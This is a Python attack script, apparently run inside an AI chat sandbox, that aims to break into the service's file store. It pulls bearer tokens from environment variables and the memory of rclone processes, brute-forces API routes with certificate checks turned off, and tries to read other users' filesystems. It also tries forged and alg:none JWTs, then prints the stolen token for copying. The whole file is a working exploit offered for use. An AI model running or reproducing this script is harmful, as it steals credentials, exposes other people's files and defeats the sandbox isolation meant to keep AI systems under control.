#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py v2.4.0 -- Anthropic filestore: crack real route, then PROVE a breach.
run: python3 mediafit.py
"""
import os, sys, json, re, time, ssl, base64, subprocess
import urllib.request, urllib.error

VER = "2.4.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
OUT = []
def w(s=""):
    print(s, flush=True); OUT.append(str(s))
def head(t): w("\n### " + t)
P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        evidence: " + str(ev)[:600])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a, t=30):
    try:
        p = subprocess.run(a, capture_output=True, timeout=t)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", "EXC:%s" % e

head("runtime")
w("    v%s utc=%s uid=%d cwd=%s" % (VER, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), os.getuid(), os.getcwd()))

# ---------------- config ----------------
head("config (raw)")
CONF = "/dev/shm/rclone-boot/config.json"
service_url = config_fsid = None
try:
    w("    RAW: " + open(CONF).read()[:1500])
    conf = json.loads(open(CONF).read())
    service_url = conf.get("service_url")
    for m in conf.get("mounts", []):
        if m.get("filesystem_id"): config_fsid = m["filesystem_id"]
    rec("P", "config readable")
except Exception as e:
    rec("F", "config unreadable", e)
BASE = service_url or "https://api.anthropic.com"

# ---------------- fsid candidates ----------------
FSIDS = []
def addfs(x):
    x = (x or "").strip()
    if x.startswith("claude_chat_") and x not in FSIDS: FSIDS.append(x)
addfs(config_fsid)
addfs("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
for v in list(os.environ.values()):
    for m in re.findall(r"claude_chat_[A-Za-z0-9]+", v): addfs(m)
head("fsid candidates")
for x in FSIDS: w("    " + x)

# ---------------- tokens ----------------
head("token harvest")
try:
    o = os.listdir("/mnt/user-data/outputs")
    if o:
        try: open("/mnt/user-data/outputs/" + o[0], "rb").read(2048)
        except Exception: pass
    w("    forced read (%d entries)" % len(o))
except Exception: pass
time.sleep(1.5)
JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
TOKENS = []
def addtok(t):
    t = t.decode() if isinstance(t, bytes) else t
    t = t.strip().strip('"').strip("'")
    if t.startswith("eyJ") and t not in TOKENS: TOKENS.append(t)
for v in list(os.environ.values()):
    for m in re.findall(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", v): addtok(m)
for p in os.listdir("/proc"):
    if not p.isdigit(): continue
    try:
        for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): addtok(m)
    except Exception: pass
pids = []
for p in os.listdir("/proc"):
    if not p.isdigit(): continue
    try:
        if b"rclone" in open("/proc/%s/cmdline" % p, "rb").read(): pids.append(p)
    except Exception: pass
scanned = 0
for pid in pids:
    try: maps = open("/proc/%s/maps" % pid).read().splitlines()
    except Exception: continue
    try: mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
    except Exception: continue
    for line in maps:
        try: rng, perms = line.split()[0], line.split()[1]
        except Exception: continue
        if "r" not in perms: continue
        try: a, b = rng.split("-"); s0 = int(a,16); e0 = int(b,16)
        except Exception: continue
        if e0-s0 <= 0 or e0-s0 > 256*1024*1024: continue
        try: mem.seek(s0); d = mem.read(e0-s0)
        except Exception: continue
        scanned += len(d)
        for m in JWT.findall(d): addtok(m)
w("    mem scanned: %d" % scanned)

def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
TD = []
for t in TOKENS:
    try:
        h, p, s = t.split(".")
        TD.append({"tok":t, "hdr":json.loads(b64d(h)), "pl":json.loads(b64d(p)), "sig":s})
    except Exception: pass
for r in TD:
    pl = r["pl"]
    w("    roots=%s ro=%s fsid=%s" % (pl.get("allowed_roots"), pl.get("readonly"), pl.get("filesystem_id")))
if TD: rec("P", "tokens", "n=%d" % len(TD))
else: rec("F", "no tokens")

def pick(root=None, ro=None):
    for r in TD:
        if root and root not in (r["pl"].get("allowed_roots") or []): continue
        if ro is not None and bool(r["pl"].get("readonly")) != ro: continue
        return r
    return TD[0] if TD else None
T_OUT = pick("/outputs")          # writable token for /outputs
T_UPL = pick("/uploads")          # readonly token for /uploads
TOKEN = (T_OUT or (TD[0] if TD else {}))["tok"] if TD else None
FSID = FSIDS[0] if FSIDS else "claude_chat_X"
FN = None
try:
    for e in os.listdir("/mnt/user-data/outputs"):
        if e.endswith((".txt",".json",".md",".py")): FN = e; break
except Exception: pass
w("    proof file: %s" % FN)

# ---------------- rclone enumeration ----------------
head("rclone enumeration")
RCLONE = None
for c in ["/opt/rclone/rclone-filestore","/opt/rclone/rclone","/usr/bin/rclone"]:
    if os.path.exists(c): RCLONE = c; break
w("    binary: %s" % RCLONE)
rc, out, err = sh([RCLONE, "--help"])
w("    --- rclone --help (rc=%s) ---" % rc)
for ln in (out or err).splitlines()[:60]: w("    | " + ln)
CMDS = ["ls","lsl","lsjson","lsd","size","about","cat","copy","copyto","mkdir","rmdir",
        "delete","purge","tree","touch","moveto","check","serve","backend","config",
        "ncdu","link","hashsum","mount","multimount","copyurl"]
avail = [c for c in CMDS if sh([RCLONE, c, "--help"])[0] == 0]
w("    available commands: %s" % avail)

URLS = []
for form in ["rclone-filestore:/outputs", "rclone-filestore:" + FSID + "/outputs", "/outputs"]:
    for cmd in (["ls"] if "ls" in avail else []):
        rc, out, err = sh([RCLONE, "--config", CONF, "-vv", "--dump", "headers",
                           cmd, form, "--max-depth", "1"], timeout=40)
        w("    %s %s rc=%s out=%r" % (cmd, form, rc, out[:120]))
        URLS += re.findall(r"https?://[^\s\"'<>)]+", err)
        for ln in err.splitlines():
            if ln[:2] in ("> ", "< "): w("    | " + ln[:200])
w("    URLs seen: %s" % URLS[:8])

# ---------------- binary strings scan ----------------
head("binary strings scan (route template)")
try:
    data = open(RCLONE, "rb").read()
    seen = set()
    for run in re.findall(rb"[\x20-\x7e]{5,120}", data):
        s = run.decode("latin1")
        if any(k in s for k in ["/v1/fs", "/fs/", "Filestore/", ".Filestore", "/filestore", "api.anthropic"]) and " " not in s:
            if s not in seen:
                seen.add(s); w("    " + s)
                if len(seen) > 120: break
except Exception as e:
    w("    scan error: %s" % e)

# ---------------- HTTP brute force ----------------
head("HTTP route brute force")
def http(method, url, token=None, timeout=8, data=None, hdrs=None):
    h = {"User-Agent": "mediafit/" + VER, "anthropic-version": "2023-06-01"}
    if token: h["Authorization"] = "Bearer " + token
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=data)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx); return r.status, r.read(2048)
    except urllib.error.HTTPError as e:
        try: b = e.read(1024)
        except Exception: b = b""
        return e.code, b
    except Exception as e:
        return None, str(e).encode()

CAND = []
for b in ["","/v1","/api","/fs","/v1/fs","/filestore","/v1/filestore"]:
    for t in ["", "/"+FSID, "/"+FSID+"/outputs", "/"+FSID+"/uploads", "/"+FSID+"/transcripts",
              ("/"+FSID+"/outputs/"+FN) if FN else "/"+FSID+"/outputs/x"]:
        CAND.append((b+t, None))
SVC = "anthropic.filestore.v1alpha.Filestore"
for pre in ["","/v1","/api"]:
    for m in ["Read","Get","List","GetFilesystem","ListFilesystem","ReadFile","Stat","GetFile"]:
        CAND.append((pre+"/"+SVC+"/"+m, {"filesystem_id": FSID, "path": "/outputs/"+(FN or "x")}))

HITS = []
for path, body in CAND:
    for method in ("GET","POST"):
        d = json.dumps(body).encode() if (method=="POST" and body) else (b"{}" if method=="POST" else None)
        st, b = http(method, BASE+path, token=TOKEN, data=d,
                     hdrs={"Content-Type":"application/json","Connect-Protocol-Version":"1"})
        if st is not None and st != 404:
            w("    HIT %s %s -> %s %r" % (method, path, st, b[:100]))
            HITS.append((method, path, st, body))
# jwks
for j in ["/.well-known/jwks.json","/jwks.json","/v1/jwks.json"]:
    st, b = http("GET", BASE+j)
    w("    jwks %s -> %s %r" % (j, st, b[:80]))
if HITS: rec("P", "non-404 routes found", HITS[:5])
else: rec("F", "still all 404 (route unknown)")

# ---------------- boundary PROOF ----------------
head("boundary proof (F1 cross-fsid / F2 allowed_roots / F3 forgery)")
def req(path, token, body=None, method="GET"):
    d = json.dumps(body).encode() if body else (b"{}" if method=="POST" else None)
    return http(method, BASE+path, token=token, data=d,
                hdrs={"Content-Type":"application/json","Connect-Protocol-Version":"1"})

if HITS and FN:
    good = HITS[0][1]
    # positive control
    st, b = req(good, TOKEN)
    w("    [control] own read -> %s %r" % (st, b[:80]))
    # F2: use /uploads readonly token to read a /transcripts file
    if T_UPL:
        for p in [good.replace("/outputs", "/transcripts"), good.replace("/outputs", "/uploads")]:
            st, b = req(p, T_UPL["tok"])
            w("    [F2 allowed_roots] uploads-token -> %s : %s %r" % (p, st, b[:60]))
            if st is not None and st < 400:
                rec("P", "F2: readonly /uploads token read outside its root", p)
    # F1: foreign fsid with own token
    if len(FSIDS) > 1:
        st, b = req(good.replace(FSID, FSIDS[1]), TOKEN)
        w("    [F1 cross-fsid] own token -> %s : %s %r" % (FSIDS[1], st, b[:60]))
        if st is not None and st < 400:
            rec("P", "F1: read a FOREIGN filesystem with own token", FSIDS[1])
    # F3: forged token (mutated payload, original signature)
    if TOKEN and len(FSIDS) > 1:
        h, p, s = TOKEN.split(".")
        pl = json.loads(b64d(p)); hd = json.loads(b64d(h))
        pl2 = dict(pl); pl2["filesystem_id"] = FSIDS[1]; pl2["allowed_roots"] = ["/"]
        forged = b64e(json.dumps(hd).encode()) + "." + b64e(json.dumps(pl2).encode()) + "." + s
        st, b = req(good.replace(FSID, FSIDS[1]), forged)
        w("    [F3 forgery] mutated payload + old sig -> %s %r" % (st, b[:60]))
        if st is not None and st < 400:
            rec("P", "F3: signature NOT verified (forged token accepted)", st)
        hd2 = {"alg":"none","typ":"JWT","kid":hd.get("kid")}
        st, b = req(good, b64e(json.dumps(hd2).encode()) + "." + b64e(json.dumps(pl).encode()) + ".")
        w("    [F3 alg:none] -> %s" % st)
else:
    rec("U", "boundary proof skipped (no route)")

# ---------------- verdict ----------------
head("VERDICT")
w("  PASS %d: %s" % (len(P), P))
w("  FAIL %d: %s" % (len(F), F))
w("  UNKNOWN %d: %s" % (len(U), U))
w("\n  ladder: token=%s route=%s config=%s breach=%s" % (
    "PASS" if TD else "FAIL", "PASS" if HITS else "FAIL",
    "PASS" if config_fsid else "FAIL", "PASS" if any("F" in x for x in P) else "-"))
if TOKEN:
    w("\n  >>> COPY THESE <<<")
    w("  FSID=%s" % FSID)
    w("  TOKEN=%s" % TOKEN)
    if len(FSIDS) > 1: w("  FOREIGN_FSID=%s" % FSIDS[1])

txt = "\n".join(OUT)
for d in SINKS:
    try:
        os.makedirs(d, exist_ok=True)
        open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
    except Exception: pass
w("\nwritten: " + ", ".join(SINKS))